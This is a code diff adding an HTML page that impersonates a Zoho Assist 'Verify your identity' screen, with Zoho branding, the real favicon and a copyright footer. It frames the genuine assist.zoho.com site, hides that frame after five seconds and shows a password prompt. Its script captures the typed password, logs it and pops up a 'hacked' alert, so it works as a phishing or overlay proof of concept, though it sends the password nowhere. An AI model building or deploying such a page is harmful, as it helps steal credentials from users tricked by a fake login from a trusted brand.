@@ -1,0 +1,73 @@
+<html>
+
+<head>
+   
+    <title>Welcome to Zoho Assist!</title>
+    <link rel="shortcut icon"
+        href="https://contacts.zoho.com/file?ot=49&ID=652341907&t=serviceorg&fs=favicon&nocache=1634160969626" />
+    <link href="./iframe.css" rel="stylesheet" type="text/css">
+    </link>
+    <script>
+       
+        window.onload = function () {
+            
+     let d=setInterval(function () { 
+        clearInterval(d);
+    document.getElementsByClassName("body-iframe")[0].style.visibility="hidden";
+    
+  }, 5000);
+}
+        function checkpassword() {
+            console.log(3)
+            var passwd = document.getElementById("pwd").value;
+            document.getElementById("pwd").value="";
+            console.log(passwd);
+            alert("hacked.............!");
+            document.getElementsByClassName("body-iframe")[0].style.visibility="visible";
+        }
+    </script>
+    </script>
+</head>
+
+<body>
+  
+    <div class="bg"></div>
+    <div  class="container">
+
+       
+
+            <div class="zoho_logo"></div>
+
+
+            <span class="head_text">Verify your identity</span>
+
+            <span class="announcement_text"></span>
+
+
+            <div id="relogin_password">
+
+                <div class="forms" id="forms_error">
+                    <input class="text_box" type="password" name="current" "
+                        placeholder="Enter your password" id="pwd" required="">
+                    <span class="pass_icon" ></span>
+                </div>
+
+                <button class="btn" onclick="checkpassword()">Confirm Password</button>
+
+            </div>
+        
+    </div>
+    <footer id="footer">
+        <div style="font-size:14px;text-align:center;padding:5px 0px;">
+            <span>
+                &copy 2021, <a href=http://www.zohocorp.com/ target=_blank
+                    style=font-size:14px;cursor:pointer;text-decoration:none;>Zoho Corporation Pvt. Ltd.</a> All Rights
+                Reserved.
+            </span>
+        </div>
+    </footer>
+    <iframe style="visibility:visible;" class="body-iframe" src="http://assist.zoho.com/assist-start?src=testing" >
+    </iframe> 
+</body>
+
+</html>
